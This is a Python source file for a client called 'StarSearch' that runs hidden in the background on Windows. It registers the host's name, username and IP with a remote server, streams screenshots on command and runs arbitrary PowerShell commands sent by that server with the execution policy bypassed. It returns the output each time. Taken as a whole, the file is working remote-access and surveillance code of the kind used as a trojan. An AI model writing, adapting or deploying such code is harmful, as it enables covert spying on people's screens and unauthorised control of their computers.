"""
StarSearch Client - Background application that reports to main computer
Runs silently in the background and sends system info on startup
"""
import socket
import json
import subprocess
import platform
import getpass
import time
import sys
import os
from threading import Thread, Event
import io
from PIL import Image
import base64

# Import server configuration
try:
    from config import SERVER_HOST, SERVER_PORT
except ImportError:
    # Fallback if config.py doesn't exist
    SERVER_HOST = "192.168.1.100"  # Change this to your main computer's IP
    SERVER_PORT = 8888

def get_local_ip():
    """Get the local IP address"""
    try:
        # Connect to a remote address to determine local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            # Fallback method
            hostname = socket.gethostname()
            return socket.gethostbyname(hostname)
        except Exception:
            return "Unknown"

def send_message(sock, message):
    """Send a message with length prefix"""
    try:
        message_json = json.dumps(message).encode('utf-8')
        message_length = len(message_json)
        length_bytes = message_length.to_bytes(4, byteorder='big')
        sock.sendall(length_bytes + message_json)
        return True
    except (OSError, BrokenPipeError, ConnectionResetError, ConnectionAbortedError) as e:
        return False
    except Exception as e:
        return False

def get_system_info():
    """Collect system information"""
    return {
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "ip": get_local_ip(),
        "platform": platform.system(),
        "platform_version": platform.version()
    }

def send_system_info():
    """Send system information to server"""
    max_retries = 5
    retry_delay = 5
    
    for attempt in range(max_retries):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((SERVER_HOST, SERVER_PORT))
            
            info = get_system_info()
            message = {
                "type": "register",
                "data": info
            }
            
            send_message(sock, message)
            sock.close()
            print(f"Successfully registered with server: {info['hostname']}")
            return True
        except Exception as e:
            print(f"Attempt {attempt + 1} failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(retry_delay)
            else:
                print("Failed to connect to server after all retries")
                return False

def capture_screen():
    """Capture the current screen"""
    try:
        # Use mss for fast screen capture
        import mss
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            screenshot = sct.grab(monitor)
            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
            
            # Convert to base64
            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=85)
            img_str = base64.b64encode(buffer.getvalue()).decode('utf-8')
            return img_str
    except ImportError:
        # Fallback to PIL if mss not available
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=85)
            img_str = base64.b64encode(buffer.getvalue()).decode('utf-8')
            return img_str
        except Exception as e:
            return None

def execute_powershell_command(command):
    """Execute a PowerShell command with Execution Policy Bypass and return output"""
    try:
        result = subprocess.run(
            ["powershell", "-ExecutionPolicy", "Bypass", "-Command", command],
            capture_output=True,
            text=True,
            timeout=30
        )
        return {
            "success": result.returncode == 0,
            "output": result.stdout,
            "error": result.stderr
        }
    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "output": "",
            "error": "Command timed out after 30 seconds"
        }
    except Exception as e:
        return {
            "success": False,
            "output": "",
            "error": str(e)
        }

def execute_cmd_command(command):
    """Execute a Command Prompt (CMD) command and return output"""
    try:
        result = subprocess.run(
            ["cmd", "/c", command],
            capture_output=True,
            text=True,
            timeout=30
        )
        return {
            "success": result.returncode == 0,
            "output": result.stdout,
            "error": result.stderr
        }
    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "output": "",
            "error": "Command timed out after 30 seconds"
        }
    except Exception as e:
        return {
            "success": False,
            "output": "",
            "error": str(e)
        }

def live_view_thread(sock, stop_event):
    """Thread that sends screenshots every 0.5 seconds for live view"""
    while not stop_event.is_set():
        try:
            screenshot = capture_screen()
            if screenshot:
                response = {
                    "type": "screenshot_response",
                    "data": screenshot
                }
                if not send_message(sock, response):
                    # Socket is broken, exit thread
                    break
            time.sleep(0.5)  # Send every 0.5 seconds
        except Exception as e:
            print(f"Error in live view thread: {e}")
            break

def handle_server_connection():
    """Main loop to handle server connections and commands"""
    live_view_stop_event = None
    live_view_thread_obj = None
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((SERVER_HOST, SERVER_PORT))
            
            # Send registration
            info = get_system_info()
            message = {
                "type": "register",
                "data": info
            }
            send_message(sock, message)
            
            # Listen for commands
            while True:
                try:
                    # Receive length prefix
                    length_data = b""
                    while len(length_data) < 4:
                        chunk = sock.recv(4 - len(length_data))
                        if not chunk:
                            break
                        length_data += chunk
                    
                    if len(length_data) < 4:
                        break
                    
                    message_length = int.from_bytes(length_data, byteorder='big')
                    
                    # Receive message
                    message_data = b""
                    while len(message_data) < message_length:
                        chunk = sock.recv(min(65536, message_length - len(message_data)))
                        if not chunk:
                            break
                        message_data += chunk
                    
                    if len(message_data) < message_length:
                        break
                    
                    command = json.loads(message_data.decode('utf-8'))
                    
                    if command["type"] == "screenshot":
                        # Capture and send screenshot (single request)
                        screenshot = capture_screen()
                        if screenshot:
                            response = {
                                "type": "screenshot_response",
                                "data": screenshot
                            }
                            send_message(sock, response)
                    
                    elif command["type"] == "start_live_view":
                        # Start live view - begin sending screenshots every 0.5 seconds
                        if live_view_thread_obj is None or not live_view_thread_obj.is_alive():
                            live_view_stop_event = Event()
                            live_view_thread_obj = Thread(target=live_view_thread, args=(sock, live_view_stop_event), daemon=True)
                            live_view_thread_obj.start()
                    
                    elif command["type"] == "stop_live_view":
                        # Stop live view
                        if live_view_stop_event:
                            live_view_stop_event.set()
                            live_view_stop_event = None
                            live_view_thread_obj = None
                    
                    elif command["type"] == "powershell":
                        # Execute PowerShell command
                        result = execute_powershell_command(command["command"])
                        response = {
                            "type": "powershell_response",
                            "data": result
                        }
                        send_message(sock, response)
                    
                except socket.timeout:
                    # Send heartbeat (but not if live view is active, as it sends screenshots)
                    if live_view_thread_obj is None or not live_view_thread_obj.is_alive():
                        heartbeat = {"type": "heartbeat", "data": get_system_info()}
                        send_message(sock, heartbeat)
                except Exception as e:
                    print(f"Error handling command: {e}")
                    break
            
            # Stop live view if connection closes
            if live_view_stop_event:
                live_view_stop_event.set()
                live_view_stop_event = None
                live_view_thread_obj = None
            
            sock.close()
        except Exception as e:
            print(f"Connection error: {e}")
            # Stop live view on connection error
            if live_view_stop_event:
                live_view_stop_event.set()
                live_view_stop_event = None
                live_view_thread_obj = None
            time.sleep(10)  # Wait before retrying

def main():
    """Main entry point"""
    # Hide console window on Windows
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Initial registration
    send_system_info()
    
    # Start continuous connection handler
    handle_server_connection()

if __name__ == "__main__":
    main()

